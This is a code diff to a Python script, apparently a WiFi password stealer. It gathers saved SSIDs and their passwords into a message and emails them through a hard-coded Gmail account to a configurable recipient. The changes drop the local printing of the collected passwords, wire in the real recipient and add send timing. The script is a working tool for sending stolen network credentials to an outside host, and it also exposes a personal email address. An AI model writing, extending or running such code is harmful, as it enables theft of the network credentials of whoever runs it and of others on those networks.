@@ -29,12 +29,12 @@ if len(profile_names) != 0:
 ## Send Wifi Password Via Mail
 #########################
 
+import time
 
+t1 = time.time()
 email_message = ""
 for item in wifi_list:
     email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"
-
-print(email_message)
 
 try:
     email = 'abubakkar.swe@gmail.com'
@@ -44,7 +44,7 @@ try:
     msg = EmailMessage()
     msg['Subject'] = 'WiFi SSIDs and Passwords'
     msg['From'] = email
-    msg['To'] = "Hello bro"
+    msg['To'] = send_to_email
 
     TEXT = email_message
     msg.set_content(TEXT)
@@ -53,7 +53,9 @@ try:
     server.starttls()
     server.login(email, password)
     server.send_message(msg)
-    print(colored(f'Successfully Mail Send to:- {send_to_email}', 'red'))
+    print(colored(f'Successfully Mail Send to:- {send_to_email}', 'green'))
     server.quit()
+    t2 = time.time()
+    print(colored(f"Time take to send mail {t2-t1} sec", 'red'))
 except:
     print("Opps!! Try Again Please")
